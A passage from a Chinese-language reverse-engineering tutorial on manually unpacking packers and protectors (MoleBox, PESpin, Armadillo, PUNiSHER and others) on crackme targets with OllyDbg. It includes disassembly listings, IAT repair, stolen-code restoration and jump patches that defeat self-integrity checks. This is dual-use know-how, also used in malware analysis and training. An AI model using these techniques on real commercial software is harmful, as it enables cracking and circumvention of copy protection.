     jmp eax                                  ; UnPackMe.0045159C\n```\n\n```asm\n0045159C    55              push ebp\n0045159D    8BEC            mov ebp,esp\n0045159F    83C4 F0         add esp,-0x10\n004515A2    B8 BC134500     mov eax,UnPackMe.004513BC                ; UNICODE \";\"\n```\n\n修复时直接删除无效指针，剪切指针程序会出错。\n\n## 7.4 MoleBox V2.6.5\n\n单步跟，跑飞的函数跟进去，就可跟到OEP。(ESP定律也行)\n\n```asm\n0045159C    55              push ebp\n0045159D    8BEC            mov ebp,esp\n0045159F    83C4 F0         add esp,-0x10\n004515A2    B8 BC134500     mov eax,UnPackMe.004513BC                ; UNICODE \";\"\n```\n\n脱壳，重建输入表时，有很多无效函数，用跟踪1全部修复。\n\n{% asset_img MoleBox.jpg MoleBox %}\n\nPEID显示无壳，但是程序不能运行。重新操作一次回到无效函数那里，看其中一个无效函数的RVA`55170`，在OD命令窗口输入`d 455170`。\n\n```asm\n00455170  00477189  UnPackMe.00477189\n```\n\n发现它是程序函数，而不是系统函数，重建表中应该全是系统函数才对。猜测它是被壳加密了。\n\n在OD重载一下程序，再次`d 455170`，这时这个地址什么都没有。\n\n```asm\n00455170  965AB0EB\n```\n\n右键->断点->硬件访问。Shift+F9直至这个地址出现系统函数。此时处于未加密状态。而这个函数与跟踪1修复函数的名字完全不一样，所以跟踪修复不一定正确。\n\n```asm\n00455170  7C801D53  kernel32.LoadLibraryExA\n```\n\n现在单步跟踪观察是哪一步让它变成程序函数。执行完下面这一步时，函数改变。也就是说这一步导致IAT重建时RVA为`55170`地址的函数无效。\n\n```asm\n00471682    8901            mov dword ptr ds:[ecx],eax               ; UnPackMe.00477189\n```\n\n为了不让它改变，往上找能绕过这个指令的跳转指令，这个跳转指令称为magic jump\n\n```asm\n00471658   /74 45           je short UnPackMe.0047169F\n0047165A   |8D55 F0         lea edx,dword ptr ss:[ebp-0x10]\n0047165D   |52              push edx                                 ; UnPackMe.0047D378\n0047165E   |6A 04           push 0x4\n00471660   |6A 04           push 0x4\n00471662   |8B45 08         mov eax,dword ptr ss:[ebp+0x8]           ; UnPackMe.00455170\n00471665   |50              push eax                                 ; UnPackMe.00477189\n00471666   |FF15 40D84700   call dword ptr ds:[0x47D840]             ; kernel32.VirtualProtect\n0047166C   |85C0            test eax,eax                             ; UnPackMe.00477189\n0047166E   |75 0A           jnz short UnPackMe.0047167A\n00471670   |B9 0B0000EF     mov ecx,0xEF00000B\n00471675   |E8 9D2F0000     call UnPackMe.00474617\n0047167A   |8B4D 08         mov ecx,dword ptr ss:[ebp+0x8]           ; UnPackMe.00455170\n0047167D   |8B55 F8         mov edx,dword ptr ss:[ebp-0x8]           ; UnPackMe.0047D378\n00471680   |8B02            mov eax,dword ptr ds:[edx]               ; UnPackMe.00477189\n00471682   |8901            mov dword ptr ds:[ecx],eax               ; UnPackMe.00477189\n00471684   |8D4D F4         lea ecx,dword ptr ss:[ebp-0xC]\n00471687   |51              push ecx                                 ; UnPackMe.00455170\n00471688   |8B55 F0         mov edx,dword ptr ss:[ebp-0x10]\n0047168B   |52              push edx                                 ; UnPackMe.0047D378\n0047168C   |6A 04           push 0x4\n0047168E   |8B45 08         mov eax,dword ptr ss:[ebp+0x8]           ; UnPackMe.00455170\n00471691   |50              push eax                                 ; UnPackMe.00477189\n00471692   |FF15 40D84700   call dword ptr ds:[0x47D840]             ; kernel32.VirtualProtect\n00471698   |C745 FC 0100000>mov dword ptr ss:[ebp-0x4],0x1\n0047169F   \\8B45 FC         mov eax,dword ptr ss:[ebp-0x4]\n```\n\n重载，同样操作走一次，将je指令修改为jmp指令。Ctrl+G去到OEP，下断点运行，发现信息窗口的这个地址还是系统函数。\n\n```asm\n00455170  7C801D53  kernel32.LoadLibraryExA\n```\n\n重建IAT时已经所有函数都有效了。脱壳，正常运行。\n\n## 7.5 PESpin 1.32(Stolen Code)\n\nESP定律，Shift+F9运行。单步跟踪发现破碎OEP。\n\n```asm\n00408D09    55              push ebp\n00408D0A   /EB 01           jmp short UnPackMe.00408D0D\n00408D0C   |3D 8BECEB01     cmp eax,0x1EBEC8B\n00408D11    2F              das\n00408D12    6A FF           push -0x1\n00408D14    EB 01           jmp short UnPackMe.00408D17\n00408D16    0C 68           or al,0x68\n00408D18    8890 BF01812C   mov byte ptr ds:[eax+0x2C8101BF],dl\n00408D1E    24 88           and al,0x88\n00408D20    6B7F 01 68      imul edi,dword ptr ds:[edi+0x1],0x68\n00408D24    ed              in eax,dx\n00408D25    8824EE          mov byte ptr ds:[esi+ebp*8],ah\n00408D28    810424 998F1B12 add dword ptr ss:[esp],0x121B8F99\n00408D2F    64:A1 00000000  mov eax,dword ptr fs:[0]\n00408D35    EB 01           jmp short UnPackMe.00408D38\n00408D37    CE              into\n00408D38    50              push eax\n00408D39    EB 01           jmp short UnPackMe.00408D3C\n```\n\n汇总一下：\n\n```asm\n00408D09    55              \tpush ebp\n00408D0D    8BEC            \tmov ebp,esp\n00408D12    6A FF           \tpush -0x1\n00408D17    68 8890BF01     \tpush 0x1BF9088\n;00408D1C    812C24 886B7F01 \tsub dword ptr ss:[esp],0x17F6B88 这个在其他OEP好像没有，去掉(因为OEP不够内存)\n00408D23    68 ED8824EE     \tpush 0xEE2488ED\n;00408D28    810424 998F1B12 \tadd dword ptr ss:[esp],0x121B8F99 这个在其他OEP好像没有，去掉\n00408D2F    64:A1 00000000  \tmov eax,dword ptr fs:[0]\n00408D38    50              \tpush eax\n00408D3C    64:8925 00000000     mov dword ptr fs:[0],esp\n00408D46    83EC 68              sub esp,0x68\n00408D4C    53                   push ebx\n00408D50    56                   push esi\n00408D54    57                   push edi\n00408D58    8965 E8              mov dword ptr ss:[ebp-0x18],esp\n00408D5E    33DB                 xor ebx,ebx\n00408D63    895D FC              mov dword ptr ss:[ebp-0x4],ebx\n00408D69    6A 02                push 0x2\n00408D6E    FF15 90214000        call dword ptr ds:[0x402190]             ; msvcrt.__set_app_type\n00408D77    59                   pop ecx\n00408D7B    830D 2C314000 FF     or dword ptr ds:[0x40312C],-0x1\n00408D85    830D 30314000 FF     or dword ptr ds:[0x403130],-0x1\n00408D8F    FF15 8C214000        call dword ptr ds:[0x40218C]             ; msvcrt.__p__fmode\n```\n\n二进制代码汇总：\n\n```\n55 8B EC 6A FF 68 88 90 BF 01 68 ED 88 24 EE 64 A1 00 00 00 00 50 64 89 25 00 00 00 00 83 EC 68 53 56 57 89 65 E8 33 DB 89 5D FC 6A 02 FF 15 90 21 40 00 59 83 0D 2C 31 40 00 FF 83 0D 30 31 40 00 FF FF 15 8C 21 40 00\n```\n\n终于到达大跳转：\n\n```asm\n00408D98  - E9 AB89FFFF          jmp UnPackMe.00401748\n```\n\nFOEP：\n\n```asm\n00401748    8B0D 20314000        mov ecx,dword ptr ds:[0x403120]\n0040174E    8908                 mov dword ptr ds:[eax],ecx\n00401750    FF15 88214000        call dword ptr ds:[0x402188]             ; msvcrt.__p__commode\n```\n\n二进制粘贴到FOEP上方，将`401700`作为新EIP。\n\n```asm\n00401700      55                 push ebp\n00401701      8BEC               mov ebp,esp\n00401703      6A FF              push -0x1\n00401705      68 8890BF01        push 0x1BF9088\n0040170A      68 ED8824EE        push 0xEE2488ED\n0040170F      64:A1 00000000     mov eax,dword ptr fs:[0]\n00401715      50                 push eax                                 ;  msvcrt._fmode\n00401716      64:8925 00000000   mov dword ptr fs:[0],esp\n0040171D      83EC 68            sub esp,0x68\n00401720      53                 push ebx\n00401721      56                 push esi\n00401722      57                 push edi\n00401723      8965 E8            mov dword ptr ss:[ebp-0x18],esp\n00401726      33DB               xor ebx,ebx\n00401728      895D FC            mov dword ptr ss:[ebp-0x4],ebx\n0040172B      6A 02              push 0x2\n0040172D      FF15 90214000      call dword ptr ds:[0x402190]             ;  msvcrt.__set_app_type\n00401733      59                 pop ecx                                  ;  005BFFD0\n00401734      830D 2C314000 FF   or dword ptr ds:[0x40312C],-0x1\n0040173B      830D 30314000 FF   or dword ptr ds:[0x403130],-0x1\n00401742      FF15 8C214000      call dword ptr ds:[0x40218C]             ;  msvcrt.__p__fmode\n00401748   .  8B0D 20314000      mov ecx,dword ptr ds:[0x403120]\n```\n\n重建IAT用importREC不行，但用Scylla脱壳成功，程序正常运行。\n\n## 7.6 eXPressor 1.3.0(VB自校验处理)\n\n单步去到大跳转。\n\n```asm\n00407D00  |.- FFE0          jmp eax                                  ;  UnPackMe.004012A0\n```\n\n去到OEP。\n\n```asm\n0040129A  - FF25 AC104000   jmp dword ptr ds:[<&msvbvm60.#ThunRTMain_100>]     ; msvbvm60.ThunRTMain\n004012A0 >  68 582E4000     push dumped_.00402E58\n004012A5    E8 F0FFFFFF     call <jmp.&msvbvm60.#ThunRTMain_100>\n```\n\n脱壳后还是运行不了，因为本来就是要考自校验的问题。\n\n将脱壳后的程序载入OD，在命令窗口输入`bpx papa`去到调用模块。\n\n方法一：找到目标为`__vbaNew2`，`__vbaNew2`的功能是调用程序的子窗口或子函数。根据分析(？)，它调用了退出函数。\n\n右键->在每个调用到`__vbaNew2`上设置断点。一个一个看。往上拉紧挨的cmp与跳转指令要格外关注，F4运行到`cmp`指令后，观察跳转指令是否绕过退出函数。绕过则不管它，没绕过将跳转实现。\n\n```asm\n00403D2A    391D E0524000   cmp dword ptr ds:[0x4052E0],ebx\n00403D30    75 10           jnz short dumped_.00403D42;跳转实现，不管\n00403D32    68 E0524000     push dumped_.004052E0                                     ; ASCII \"d窝\"\n00403D37    68 2C384000     push dumped_.0040382C\n00403D3C    FF15 8C104000   call dword ptr ds:[<&msvbvm60.#__vbaNew2_340>]            ; msvbvm60.__vbaNew2\n00403D42    8B35 E0524000   mov esi,dword ptr ds:[0x4052E0]\n```\n\n看到有两个`cmp`与`jnz`组合，先F4、F8走一下看它是怎么运行的。\n\n```asm\n00403F35    66:395D E4      cmp word ptr ss:[ebp-0x1C],bx\n00403F39    75 56           jnz short dumped_.00403F91;不实现\n00403F3B    391D E0524000   cmp dword ptr ds:[0x4052E0],ebx\n00403F41    75 10           jnz short dumped_.00403F53;实现\n00403F43    68 E0524000     push dumped_.004052E0                                     ; ASCII \"d窝\"\n00403F48    68 2C384000     push dumped_.0040382C\n00403F4D    FF15 8C104000   call dword ptr ds:[<&msvbvm60.#__vbaNew2_340>]            ; msvbvm60.__vbaNew2\n```\n\n如果jnz不修改，F9出现异常。如果jnz修改为jmp，F9程序正常终止。所以第一个`jnz`应该修改为`jmp`。\n\n又来两个`cmp`与跳转指令结合\n\n```asm\n00404295    817D E4 C05D000>cmp dword ptr ss:[ebp-0x1C],0x5DC0\n0040429C    7E 54           jle short dumped_.004042F2;不实现\n0040429E    391D E0524000   cmp dword ptr ds:[0x4052E0],ebx\n004042A4    75 10           jnz short dumped_.004042B6;实现\n004042A6    68 E0524000     push dumped_.004052E0                                     ; ASCII \"d窝\"\n004042AB    68 2C384000     push dumped_.0040382C\n004042B0    FF15 8C104000   call dword ptr ds:[<&msvbvm60.#__vbaNew2_340>]            ; msvbvm60.__vbaNew2\n```\n\n如果jnz不修改，F9出现正常终止。如果jnz修改为jmp，F9程序弹出主程序。所以`jle`应该修改为`jmp`。\n\n因为已经可以出现主程序了，所以后面的调用可以不管它。保存两处修改，程序可以跑起来。\n\n## 7.7  **delphi自效验的处理** \n\n是FSG 2.0的壳，上面有说，不再赘述。在修复时，会发现只有3个指针，这种情况是不可能有的，所以要手动查找IAT指针。\n\n```asm\n0045273F    A1 E03F4500     mov eax,dword ptr ds:[0x453FE0]\n```\n\n在窗口命令输入`d 453FE0`，发现全是程序函数还有ASCII码，不是我们要找的IAT指针。\n\n```asm\n00453FE0  00455BB0  UnPackMe.00455BB0\n00453FE4  00453014  UnPackMe.00453014\n00453FE8  00407138  ASCII \"dVE\"\n00453FEC  0041ADD0  ASCII \"dVE\"\n```\n\n往下滑啊滑啊(Zzz...)，终于来到IAT，起始地址`45612C`，末尾`456738`，大小`456738-45612C=60C`\n\n```asm\n00456128  00000000\n0045612C  7C93135A  ntdll.RtlDeleteCriticalSection\n00456130  7C9210E0  ntdll.RtlLeaveCriticalSection\n```\n\n脱壳后的程序没有弹出错误提示，双击“运行不了”的情况，大多数是程序有自校验的问题，它是运行了又退出了。\n\n与7.6一样，在命令窗口输入`bp FindFirstFileA`（dll领空）下断避免后续程序跑飞。在命令窗口输入`bpx papa`，找到`EixtProcess`函数下断(因为7.6找不到这个函数，经过分析得出`__vbaNew2`调用退出函数)。\n\nF9，运行到dll领空Alt+F9返回。再F9运行到达某个退出函数断点处。这是switch语句执行default时的代码。\n\n```asm\n004523A6   > \\50            push eax                                 ;  Default case of switch 00451FB8\n004523A7   .  89D8          mov eax,ebx\n004523A9   .  29D8          sub eax,ebx\n004523AB   .  89C3          mov ebx,eax\n004523AD   .  89D8          mov eax,ebx\n004523AF   .  01D8          add eax,ebx\n004523B1   .  89C3          mov ebx,eax\n004523B3   .  58            pop eax\n004523B4   .  6A 00         push 0x0                                 ; /ExitCode = 0x0\n004523B6   .  E8 F540FBFF   call <jmp.&kernel32.#ExitProcess_183>    ; \\ExitProcess\n```\n\n上下找一下发现只有`case 2E4E9`没有退出函数。\n\n```asm\n004523BB   > \\33C0          xor eax,eax                              ;  Case 2E4E9 of switch 00451FB8\n```\n\n这个地址跳转来自很多，但只有一个是条件跳转`0045208C`，往上看在`00452085`下断点，重载运行几下运行发现可以停在这里。jg不要实现，因为我们想在je跳转。\n\n```asm\n00452085   > \\3D E9E40200   cmp eax,0x2E4E9\n0045208A   .  7F 6A         jg short dumped_.004520F6\n0045208C   .  0F84 29030000 je dumped_.004523BB\n```\n\n修改一下\n\n```asm\n0045208A      90            nop\n0045208B      90            nop\n0045208C      E9 2A030000   jmp dumped_.004523BB\n```\n\n一路F8，在这又遇到了`2E4E9`，运行到jnz实现了，按道理它实现就不让它实现，nop掉。\n\n```asm\n00452775  |.  3D E9E40200   cmp eax,0x2E4E9\n0045277A  |.  75 0C         jnz short dumped_.00452788\n```\n\n一路F8，又遇到了`2E4E9`，je要改为jmp，要不然就退出了。\n\n```asm\n00452419  |.  3D E9E40200   cmp eax,0x2E4E9\n0045241E  |.  74 07         je short dumped_.00452427\n00452420  |.  6A 00         push 0x0                                 ; /ExitCode = 0x0\n00452422  |.  E8 8940FBFF   call <jmp.&kernel32.#ExitProcess_183>    ; \\ExitProcess\n00452427  |>  33C0          xor eax,eax\n```\n\n修改完这3处，程序正常运行。结果OD不能选择所有修改(我的原因)，那就修改一处保存一次重载新程序一次。\n\n## 7.8 GHF Protector V1.0\n\n脱壳的最佳时机：手动脱壳理想的最佳dump时机是指壳已经把程序代码包括资源等数据全部解密、输入表等数据还原但未填充系统函数地址、dll还没重定位，此时dump出来的文件只需修正OEP、ImportTableRVA等信息即可正常运行完成脱壳。\n\nPEID查壳说是ASProtect 1.32的壳，但载入OD的壳特征明显不是ASProtect，并且程序的图标也被隐藏了。题目给了这是GHF Protector V1.0的壳。(可能不同程序入口代码不同)\n\n```asm\n00511709 >  50              push eax\n0051170A    7C 05           jl short UnPackMe.00511711\n0051170C    52              push edx                                 ; ntdll.KiFastSystemCallRet\n0051170D    c1c4 80         rol esp,0x80\n00511710    5A              pop edx                                  ; kernel32.7C817077\n00511711    58              pop eax                                  ; kernel32.7C817077\n```\n\n### 7.8.1 最佳脱壳时机\n\n在`M`模块，`.idata`下断，Shift+F9运行，F7、F8走到这，这里是最佳的脱壳时机。算是这个壳的一个特征，三个跳转指令，且有`0x80000000`和`0x7FFFFFFF`。\n\n```asm\n005114A2   /74 2A           je short UnPackMe.005114CE\n005114A4   |F7C2 00000080   test edx,0x80000000\n005114AA   |74 08           je short UnPackMe.005114B4\n005114AC   |81E2 FFFFFF7F   and edx,0x7FFFFFFF\n005114B2   |EB 04           jmp short UnPackMe.005114B8\n```\n\n用PEtools半脱壳，设置PEtools选项：\n\n{% asset_img GHF_PEtools.jpg GHF_PEtools %}\n\n或者用LoadPE半脱壳，在选项设置一下：\n\n{% asset_img GHF_PE设置.png GHF_PE设置 %}\n\n不要修正镜像大小，否则不能抓取进程。程序正常运行，但壳还没脱干净。\n\n再将半脱壳后的程序载入OD，用ESP定律找到OEP。LoadPE脱壳，还原默认设置。\n\n{% asset_img PE默认.png PE默认 %}\n\nimportREC重建IAT，脱壳成功。\n\n### 7.8.2 使用LoadLibraryA\n\n在命令窗口输入`bp LoadLibraryA`回车，Shift+F9运行8次后，Alt+F9返回，取消断点，单步跟踪。(不知道为什么是8次)\n\n到达这里，edx=00401700，是一个大跳转。\n\n```asm\n0040729F  ^\\FFE2            jmp edx\n```\n\nF8到达OEP。\n\n用LoadPE，按7.8.1设置PE选项，程序可以运行，但壳还没脱干净，重建IAT即可。如果按PE默认，PEID显示这不是一个有效的PE文件。\n\n或者用PEtools，按如下设置，重建IAT就可成功运行。\n\n{% asset_img GHF_PEtools.jpg GHF_PEtools %}\n\n### 7.8.3 使用GlobalFree\n\n在命令窗口输入`bp GlobalFree`回车，Shift+F9，再Alt+F9，取消断点，单步跟踪也能去到OEP。\n\n## 7.9 Armadillo(穿山甲) 6.04\n\n穿山甲需要处理Magic jump，都有IAT加密。\n\n### 7.9.1 使用GetModuleHandleA+9/+5\n\n忽略所有异常，在StrongOD中勾选“跳过某些异常”。在命令窗口输入`bp GetModuleHandleA+9`下断，Shift+F9运行N次，直到堆栈窗口出现：\n\n```asm\n001293E4 /0012EB40\n001293E8 |00B88683 RETURN to 00B88683 from kernel32.GetModuleHandleA\n001293EC |00BB514C ASCII \"kernel32.dll\"\n001293F0 |00BB6D64 ASCII \"VirtualFree\"\n001293F4 |0EF6D207\n001293F8 |00454380 UnPackMe.00454380\n```\n\n再Shift+F9一次，Alt+F9返回，单步到Magic Jump，将它nop掉。(我也不知道为什么这里是Magic Jump)\n\n```asm\n00B6AA13   /75 05           jnz short 00B6AA1A;nop\n```\n\n往下拉到这里，F4运行到此处，再撤销刚才对Magic Jump的修改。因为穿山甲会检测某种保护下壳的完整性。\n\n```asm\n00B6AC9A   /EB 03           jmp short 00B6AC9F\n```\n\n接着再下第二个断点`bp CreateThread`，Shift+F9运行。再Alt+F9返回。\n\n```asm\n00B7614C    50              push eax\n00B7614D    FF15 9032BB00   call dword ptr ds:[0xBB3290]             ; kernel32.CloseHandle\n00B76153    5E              pop esi                                  ; UnPackMe.00454380\n```\n\n单步跟踪到这，F7进入即可到达OEP。\n\n```asm\n00B930E5    FFD2            call edx                                 ; UnPackMe.00401700\n```\n\n或者不下第二个断点，在`M`模块的`.text`下断运行，单步跟踪到上面指令再F7进入OEP。\n\n```asm\n00401700    55              push ebp\n00401701    8BEC            mov ebp,esp\n00401703    6A FF           push -0x1\n00401705    68 00254000     push UnPackMe.00402500\n0040170A    68 86184000     push UnPackMe.00401886\n```\n\n常规脱壳即可。\n\n### 7.9.2 使用VirtualProtect\n\n在命令窗口输入`bp VirtualProtect`，处理IAT加密。Shift+F9，注意寄存器ecx。当运行到ecx=00401000时，Alt+F9返回，取消断点。右键->查找->命令(Ctrl+F)，输入`push 100`，勾选“整个块”来到这里。(不勾选会找错地址，血的教训！)\n\n```asm\n00B42EC0    55              push ebp;修改为retn\n00B42EC1    8BEC            mov ebp,esp\n00B42EC3    83EC 2C         sub esp,0x2C\n00B42EC6    833D 20F6BB00 0>cmp dword ptr ds:[0xBBF620],0x0\n00B42ECD    75 59           jnz short 00B42F28\n00B42ECF    C745 EC 13004BB>mov dword ptr ss:[ebp-0x14],0xBA4B0013\n00B42ED6    68 00010000     push 0x100\n```\n\n将第1行代码修改为`retn`，因为下面的代码是执行加密。\n\n之后再下断点`bp CreateThread`或者去到`M`模块`.text`下断运行，单步跟踪同样去到OEP。 \n\n## 7.10 Armadillo 4.40\n\n脱壳方法同7.9.1，`LoadLibraryA`下面的跳转就是magic jump？将它修改为`jmp`(什么时候修改为nop什么时候修改为nop？看它是否跳转？)\n\n```asm\n00AB5FE3    FF15 BC62AD00   call dword ptr ds:[0xAD62BC]             ; kernel32.LoadLibraryA\n00AB5FE9    8B0D AC40AE00   mov ecx,dword ptr ds:[0xAE40AC]\n00AB5FEF    89040E          mov dword ptr ds:[esi+ecx],eax\n00AB5FF2    A1 AC40AE00     mov eax,dword ptr ds:[0xAE40AC]\n00AB5FF7    391C06          cmp dword ptr ds:[esi+eax],ebx\n00AB5FFA    0F84 2F010000   je 00AB612F\n```\n\n之后同7.9.1\n\n用7.9.2方法好像不太可。\n\n## 7.11 PEBundle 2.0b5 - 3.0x\n\n用ESP定律找到OEP。脱壳后运行不了，但查壳没壳。考虑是importREC重建IAT时那些被我们剪切掉的指针是有用的，壳将它们加密了让我们以为那些指针没用。\n\n随便找一个无效指针偏移地址为`5517C`，在OD重载，命令窗口输入`d 45517C`，在它上面一行(有效指针)下硬件访问断点。F8几下跑飞，但被我们下的硬件断点截住了。断点上面的地址已经出现系统函数。\n\n```asm\n0045516C  7C8101B1  kernel32.lstrcpynA\n00455170  7C801D53  kernel32.LoadLibraryExA\n00455174  7C80A4B5  kernel32.GetThreadLocale\n00455178  0005589E\n0045517C  000558B0\n```\n\nF8走几下，发现这里是一个循环，并且`45517C`被加密。\n\n```asm\n00471E14    8B19            mov ebx,dword ptr ds:[ecx]\n00471E16    83C1 04         add ecx,0x4\n00471E19    85DB            test ebx,ebx                             ; UnPackMe.004558C4\n00471E1B    74 33           je short UnPackMe.00471E50\n00471E1D    8BC3            mov eax,ebx                              ; UnPackMe.004558C4\n00471E1F    F7C3 00000080   test ebx,0x80000000\n00471E25    74 08           je short UnPackMe.00471E2F\n00471E27    81E3 FFFF0000   and ebx,0xFFFF\n00471E2D    EB 04           jmp short UnPackMe.00471E33\n00471E2F    43              inc ebx                                  ; UnPackMe.004558C4\n00471E30    43              inc ebx                                  ; UnPackMe.004558C4\n00471E31    03DA            add ebx,edx                              ; UnPackMe.00400000\n00471E33    51              push ecx                                 ; UnPackMe.00455184\n00471E34    52              push edx                                 ; UnPackMe.00400000\n00471E35    899D C2214000   mov dword ptr ss:[ebp+0x4021C2],ebx      ; UnPackMe.004558C4\n00471E3B    53              push ebx                                 ; UnPackMe.004558C4\n00471E3C    FFB5 BA214000   push dword ptr ss:[ebp+0x4021BA]         ; kernel32.7C800000\n00471E42    E8 32010000     call UnPackMe.00471F79\n00471E47    5A              pop edx                                  ; UnPackMe.00471DBC\n00471E48    59              pop ecx                                  ; UnPackMe.00471DBC\n00471E49    85C0            test eax,eax                             ; UnPackMe.0047214A\n00471E4B    74 05           je short UnPackMe.00471E52\n00471E4D    AB              stos dword ptr es:[edi]\n00471E4E  ^ EB C4           jmp short UnPackMe.00471E14\n```\n\n```asm\n00455178  7C801EF2  kernel32.GetStartupInfoA\n0045517C  00471F79  UnPackMe.00471F79\n```\n\n再准确一点，程序运行完下面这条指令，`45517C`显示被加密。\n\n```asm\n00471E4D    AB              stos dword ptr es:[edi]\n```\n\nSTOS指令：是将AL/AX/EAX的值存储到[EDI]指定的内存单元中。\n\n往上看最近的eax就是call产生的。所以这个call很可能是加密函数。跟进去，着重看寄存器eax。我们已知`455178`的函数没有被加密，程序运行到这一步，eax显示函数。\n\n```asm\n00471FBF    85C0            test eax,eax                                       ; kernel32.GetStartupInfoA\n00471FC1   /74 25           je short UnPackMe.00471FE8;没有实现\n```\n\n到这一步eax显示为0。\n\n```asm\n00471FDF    85C0            test eax,eax\n00471FE1   /74 02           je short UnPackMe.00471FE5;跳转实现\n```\n\n一路到stos，函数出现在数据窗口。第二次循环就是我们要找的`45517C`的函数。进去到`471FBF`处，这已经显示了`45517C`未加密的系统函数`kernel32.GetProcAddress`，可以直接在import REC上修改。但我们需要将所有被加密的函数还原，不可能一个一个这样找，太麻烦了。\n\n```asm\n00471FBF    85C0            test eax,eax                                       ; kernel32.GetProcAddress\n00471FC1   /74 25           je short UnPackMe.00471FE8;没有实现\n```\n\n继续对比两者异同，到这一步eax显示的是加密函数`UnPackMe.00471F79`。\n\n```asm\n00471FDF    85C0            test eax,eax                                       ; UnPackMe.00471F79\n00471FE1    74 02           je short UnPackMe.00471FE5;没有实现\n```\n\n在`471FE1`处，未加密函数跳转实现而加密函数跳转未实现，所以应该将`471FE1`处的跳转改为`jmp`。继续单步观察数据窗口，验证修改是否正确。\n\n```asm\n00455178  7C801EF2  kernel32.GetStartupInfoA\n0045517C  7C80AE40  kernel32.GetProcAddress\n```\n\n复制到可执行文件，将新的程序载入OD寻找OEP，脱壳，没有无效指针，程序成功运行。\n\n## 7.12 PUNiSHER 1.5\n\n这个壳比较特殊，下面用原版OD进行破解。首先忽略所有异常，隐藏好OD。Options -> Debugging options -> Exceptions，全选。\n\n载入OD，程序停在此处。在命令行下断`bp LoadLibraryA+5`。\n\n```asm\n00408061 > /EB 04           jmp short UnPackMe.00408067\n00408063   |83A4BC CE60EB04>and dword ptr ss:[esp+edi*4+0x4EB60CE],0>\n0040806B    BC 0411E800     mov esp,0xE81104\n```\n\nShift + F9运行程序，查看堆栈变化，第一次：\n\n```asm\n0012FF98   FFFEBDA9\n0012FF9C   004083EC  RETURN to UnPackMe.004083EC\n0012FFA0   0040821F  ASCII \"USER32.DLL\"\n0012FFA4   005E5918\n```\n\nShift + F9第二次，已经看到`LoadLibraryA`了：\n\n```asm\n0012E9B4  /0012EA5C\n0012E9B8  |73FBE2BF  RETURN to usp10.73FBE2BF from kernel32.LoadLibraryA\n0012E9BC  |73FA1840  ASCII \"gdi32.dll\"\n0012E9C0  |73FBE4B9  usp10.<ModuleEntryPoint>\n```\n\n再Shift + F9一次，此时为我们的最佳返回时机。Alt + F9返回：\n\n```asm\n0012FF98   FFFA31E5\n0012FF9C   003C0470  RETURN to 003C0470\n0012FFA0   003C00B7  ASCII \"USER32.DLL\"\n0012FFA4   005E5918\n```\n\n取消断点，F8单步，遇到向上跳转时忽略，继续往下。直到去到`003C08C5`处。\n\n```asm\n003C08C5    8D85 ADD64100   lea eax,dword ptr ss:[ebp+0x41D6AD]\n003C08CB    870424          xchg dword ptr ss:[esp],eax              ; UnPackMe.00402494\n003C08CE    FF95 E1CE4100   call dword ptr ss:[ebp+0x41CEE1]         ; kernel32.OutputDebugStringA\n003C08D4    80BD E9CE4100 0>cmp byte ptr ss:[ebp+0x41CEE9],0x0\n```\n\n此时，信息窗口显示：\n\n```asm\nAddress=003C0892, (ASCII \"%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s\")\neax=00402494 (UnPackMe.00402494)\n```\n\n把上面的汇编代码前两行NOP掉，避免产生溢出错误。继续往下，来到两个连续的jmp指令。\n\n```asm\n003C0B1C  ^\\EB BF           jmp short 003C0ADD\t;不跳转\n003C0B1E  ^ E9 36FEFFFF     jmp 003C0959\t\t;跳转\n```\n\n第一个jmp指令不跳，第二个jmp指令跳转。跳转后继续单步，看到大跳转了，跳过去就是Stolen Code的开始处。\n\n```asm\n003C0959    8B85 EACE4100   mov eax,dword ptr ss:[ebp+0x41CEEA]\n003C095F    8D9D FEDC4100   lea ebx,dword ptr ss:[ebp+0x41DCFE]\n003C0965    50              push eax\n003C0966    E8 0E000000     call 003C0979\n003C096B    50              push eax\n003C096C    53              push ebx                                 ; UnPackMe.00400000\n003C096D    E8 8EF7FFFF     call 003C0100\n003C0972    83C4 08         add esp,0x8\n003C0975  - FF6424 FC       jmp dword ptr ss:[esp-0x4]\n003C0979    60              pushad\n003C097A    EB 04           jmp short 003C0980\n```\n\n跳过去是jmp指令，继续F8找到熟悉的VC程序入口，遇到近call要F7跟进去。\n\n```asm\n009F0000   /EB 04           jmp short 009F0006\n009F0002   |8182 8241D9EE E>add dword ptr ds:[edx+0xEED94182],0x8C83>\n009F000C    8C82 DB5C24FC   mov word ptr ds:[edx+0xFC245CDB],es\n009F0012    EB 04           jmp short 009F0018\n```\n\n来到这儿时，终于看到被抽取代码的了，VC程序入口：\n\n```asm\n009F022D    90              nop\n009F022E    64:A1 00000000  mov eax,dword ptr fs:[0]\n009F0234    50              push eax\n009F0235    64:8925 0000000>mov dword ptr fs:[0],esp\n009F023C    83EC 68         sub esp,0x68\n009F023F    53              push ebx\n009F0240    56              push esi                                 ; UnPackMe.00404038\n009F0241    57              push edi                                 ; UnPackMe.00407B90\n009F0242    8965 E8         mov dword ptr ss:[ebp-0x18],esp\n009F0245    33DB            xor ebx,ebx\n009F0247    895D FC         mov dword ptr ss:[ebp-0x4],ebx\n```\n\n但是前面还缺少了55开头的OEP，此时堆栈前2行就是第4、第5行push的地址。自行补上：\n\n```asm\npush ebp\nmov ebp esp\npush -1\npush 004023D0\npush 00401616\n```\n\n继续找被抽取的代码：\n\n```asm\n009F02B7    90              nop\n009F02B8    FF15 7C214000   call dword ptr ds:[0x40217C]             ; msvcrt.__set_app_type\n009F02BE    59              pop ecx\n009F02BF    830D 3C314000 F>or dword ptr ds:[0x40313C],0xFFFFFFFF\n009F02C6    830D 40314000 F>or dword ptr ds:[0x403140],0xFFFFFFFF\n009F02CD    FF15 78214000   call dword ptr ds:[0x402178]             ; msvcrt.__p__fmode\n009F02D3    8B0D 30314000   mov ecx,dword ptr ds:[0x403130]\n009F02D9    8908            mov dword ptr ds:[eax],ecx\n009F02DB    FF15 74214000   call dword ptr ds:[0x402174]             ; msvcrt.__p__commode\n009F02E1    8B0D 2C314000   mov ecx,dword ptr ds:[0x40312C]\n009F02E7    8908            mov dword ptr ds:[eax],ecx\n009F02E9    A1 70214000     mov eax,dword ptr ds:[0x402170]\n009F02EE    8B00            mov eax,dword ptr ds:[eax]\n009F02F0    A3 38314000     mov dword ptr ds:[0x403138],eax\n```\n\n遇到下面这种垃圾语句一定要将它改为NOP，否则程序会出错。\n\n```asm\n009F037C    0F31            